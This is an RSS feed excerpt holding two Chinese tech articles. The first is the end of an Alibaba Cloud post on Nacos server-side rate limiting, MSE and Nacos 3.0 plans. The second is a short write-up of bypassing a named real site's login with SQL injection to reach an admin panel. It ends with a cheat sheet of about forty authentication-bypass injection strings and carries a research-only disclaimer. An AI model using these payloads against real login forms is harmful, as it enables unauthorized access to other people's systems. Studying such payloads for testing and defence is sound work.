data-pid=&quot;OSvY1435&quot;&gt;在上一章节中的使用须知里，我们分享了使用 nacos 配置中心的一些使用限制及误用场景，而当客户端错用已经发生时，服务端的反脆弱机制保证了客户端的错用不会影响服务端的可用性。&lt;/p&gt;&lt;p data-pid=&quot;UXXwWlHf&quot;&gt;服务端的反脆弱机制包括连接限流，频繁变更限流，配置发布流量限流等机制来保证可用性。&lt;/p&gt;&lt;i&gt;&lt;b&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;693&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;693&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-c057c997859f261a133964a4c6aee5db_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/b&gt;&lt;/i&gt;&lt;h2&gt;商业化 MSE 优势&lt;/h2&gt;&lt;p data-pid=&quot;wN2kl3MB&quot;&gt;微服务引擎 MSE 是一个面向业界主流开源微服务框架 SpringCloud、Dubbo 以及多语言等一站式微服务平台，支持服务网格生态，标准、灵活、精准的控制流量，帮助提升系统整体的可用性，并且 MSE 在高可用、性能、安全方面大量增强，让您的应用获得企业级的保障。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;649&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-77853bde0cd9f97e420df62915ff62fd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;hDFn2W2i&quot;&gt;MSE Nacos 和自建 Nacos 对比&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;426&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-ef3c09679093f7e5db1028984b047b17_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h3&gt;迁移指引&lt;/h3&gt;&lt;h2&gt;Nacos 3.0&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;660&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;660&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-26fe8588a91386a23012e7f48ba1b5dd_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;dXB-Gj6k&quot;&gt;Nacos3.0 中，在 SDK 能力提升，界面交互升级，服务端核心能力，可观测可运维，稳定性&amp;amp;高可用方面都规划了诸多功能，除了基础通用的产品能力外，其中配置中心规划了社区呼声较高的模糊订阅功能，也将基于长连接的一致性协议进行升级，提升当前版本在边界异常场景下的稳定性及可靠性，欢迎对 Nacos 感兴趣的社区开发者参与其中。&lt;/p&gt;&lt;p data-pid=&quot;uF0Swcwg&quot;&gt;&lt;i&gt;作者：翼严&lt;/i&gt;&lt;/p&gt;&lt;p data-pid=&quot;nrUspCpO&quot;&gt;&lt;b&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//click.aliyun.com/m/1000368095/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;原文链接&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p data-pid=&quot;gyqPmdiG&quot;&gt;&lt;b&gt;本文为阿里云原创内容，未经允许不得转载。&lt;/b&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>acfe24133a1ed79c9023505ab3b0568e</guid>
<title>使用 SQL 注入绕过身份验证</title>
<link>https://toutiao.io/k/gh9wc5w</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content js_underline_content             autoTypeSetting24psection&amp;#10;            &quot; id=&quot;js_content&quot;&gt;&lt;p&gt;使用SQL注入绕过身份验证&lt;/p&gt;&lt;p&gt;声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。&lt;/p&gt;&lt;h2&gt;&lt;span&gt;正文&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p&gt;这里主要记录一下sqli一些笔记:&lt;/p&gt;&lt;p&gt;首先发现了一个子域:&lt;code&gt;https://dealeremail.autotrader.co.uk/&lt;/code&gt;, 有个登陆页面,如下:&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.26215993404781535&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGxtfhiavhZADTy6gSNayO5lY8ItebGvAShA8oEdCQtgfPgbnCjW02K0w/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2426&quot;/&gt;&lt;/figure&gt;&lt;p&gt;用不同的用户名和密码多次登录,但都没有成功,在对 SQLi 进行测试后，在用户名字段中输入了 1”，并发生了类似下面这样的错误:&lt;/p&gt;&lt;p&gt;SELECT * FROM adm where the Error was Long and had the SQL Query that the login page function was using&lt;/p&gt;&lt;p&gt;在用户名和密码字段中使用了最常见的注入字符串,而后进入了管理员面板，使用字符串&lt;code&gt;admin&#x27;-&#x27;&lt;/code&gt; 作为用户名,同样的&lt;code&gt;admin&#x27;-&#x27; &lt;/code&gt;也作为密码。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5886654478976234&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGJsOwA3JX3ZmH1LwX20qReeNON2v9E9yftAgx3NRAFqcTkHTtDdIJrg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2188&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3835616438356164&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGKmloy3ibYqcJFhEnSic2gnmoBCykyHRBqNGXaOH1ZpK1BpDiaDsMEN8cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2336&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.625&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGOSAFPFy3FHSpBIwAcJn32HTicbtkH9WlQU6pTYPqjTVqMcwicOOoiaHiaA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2048&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.522508038585209&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7Gicic0EbntzzSOffZm5EejGUagogqicEGEAdmwu3QQXaaRy31hbF1y7toxcrMzjGcau7KTpjrPdVgw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2488&quot;/&gt;&lt;/figure&gt;&lt;p&gt;以上就是poc,但是添加了一些常见的一些字符串&lt;/p&gt;&lt;p&gt;最后分享一下SQLi认证绕过常用备忘单&lt;/p&gt;&lt;pre&gt;&lt;code&gt;or 1=1&lt;br/&gt;or 1=1–&lt;br/&gt;or 1=1#&lt;br/&gt;or 1=1/*&lt;br/&gt;admin” or “1”=”1″–&lt;br/&gt;admin” or “1”=”1″#&lt;br/&gt;admin” or “1”=”1″/*&lt;br/&gt;admin”or 1=1 or “”=”&lt;br/&gt;admin” or 1=1&lt;br/&gt;admin” or 1=1–&lt;br/&gt;admin” or 1=1#&lt;br/&gt;admin” or 1=1/*&lt;br/&gt;admin”) or (“1″=”1&lt;br/&gt;admin”) or (“1″=”1”–&lt;br/&gt;admin”) or (“1″=”1″#&lt;br/&gt;admin”) or (“1″=”1″/*&lt;br/&gt;admin”) or “1”=”1&lt;br/&gt;admin”) or “1”=”1″–&lt;br/&gt;admin”) or “1”=”1″#&lt;br/&gt;admin”) or “1”=”1″/*&lt;br/&gt;admin’ —&lt;br/&gt;admin’ #&lt;br/&gt;admin’/*&lt;br/&gt;admin’ or ‘1’=’1&lt;br/&gt;admin’ or ‘1’=’1′–&lt;br/&gt;admin’ or ‘1’=’1’#&lt;br/&gt;admin’ or ‘1’=’1’/*&lt;br/&gt;admin’or 1=1 or ”=’&lt;br/&gt;admin’ or 1=1&lt;br/&gt;admin’ or 1=1–&lt;br/&gt;admin’ or 1=1#&lt;br/&gt;admin’ or 1=1/*&lt;br/&gt;admin’) or (‘1’=’1&lt;br/&gt;admin’) or (‘1’=’1’–&lt;br/&gt;admin’) or (‘1’=’1’#&lt;br/&gt;admin’) or (‘1’=’1’/*&lt;br/&gt;admin’) or ‘1’=’1&lt;br/&gt;admin’) or ‘1’=’1′–&lt;br/&gt;admin’) or ‘1’=’1’#&lt;br/&gt;admin’) or ‘1’=’1’/*&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;mp-style-type data-value=&quot;3&quot;/&gt;&lt;/p&gt;&lt;/div&gt;

          
        &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
</channel></rss>